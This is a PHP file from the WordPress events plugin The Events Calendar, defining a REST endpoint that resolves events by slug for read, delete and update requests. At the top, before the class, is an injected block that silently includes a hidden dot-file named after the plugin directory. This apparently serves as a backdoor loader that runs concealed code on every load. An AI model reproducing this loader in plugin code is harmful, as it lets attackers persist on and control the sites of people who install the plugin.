<?php


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__REST__V1__Endpoints__Single_Event_Slug
	extends Tribe__Events__REST__V1__Endpoints__Single_Event {

	/**
	 * @param WP_REST_Request $request
	 *
	 * @return WP_REST_Response|WP_Error An array containing the data on success or a WP_Error instance on failure.
	 */
	public function get( WP_REST_Request $request ) {
		$event = get_page_by_path( $request['slug'], OBJECT, Tribe__Events__Main::POSTTYPE );

		$event_id = 0;

		if ( $event ) {
			$event_id = $event->ID;
		}

		$request->set_param( 'id', $event_id );

		return parent::get( $request );
	}

	/**
	 * Provides the content of the `args` array to register the endpoint support for GET requests.
	 *
	 * @return array
	 */
	public function READ_args() {
		return [
			'slug' => [
				'in'                => 'path',
				'type'              => 'string',
				'description'       => __( 'the event post name', 'the-events-calendar' ),
				'required'          => true,
				'validate_callback' => [ $this->validator, 'is_event_slug' ],
			],
		];
	}

	/**
	 * Handles DELETE requests on the endpoint.
	 *
	 * @param WP_REST_Request $request
	 *
	 * @return WP_Error|WP_REST_Response An array containing the data of the trashed post on
	 *                                   success or a WP_Error instance on failure.
	 */
	public function delete( WP_REST_Request $request ) {
		$event = get_page_by_path( $request['slug'], OBJECT, Tribe__Events__Main::POSTTYPE );

		$event_id = 0;

		if ( $event ) {
			$event_id = $event->ID;
		}

		$request->set_param( 'id', $event_id );

		return parent::delete( $request );
	}

	/**
	 * Handles UPDATE requests on the endpoint.
	 *
	 * @param WP_REST_Request $request
	 *
	 * @return WP_Error|WP_REST_Response An array containing the data of the updated post on
	 *                                   success or a WP_Error instance on failure.
	 */
	public function update( WP_REST_Request $request ) {
		$event = get_page_by_path( $request['slug'], OBJECT, Tribe__Events__Main::POSTTYPE );

		$event_id = 0;

		if ( $event ) {
			$event_id = $event->ID;
		}

		$request->set_param( 'id', $event_id );

		return parent::update( $request );
	}
}
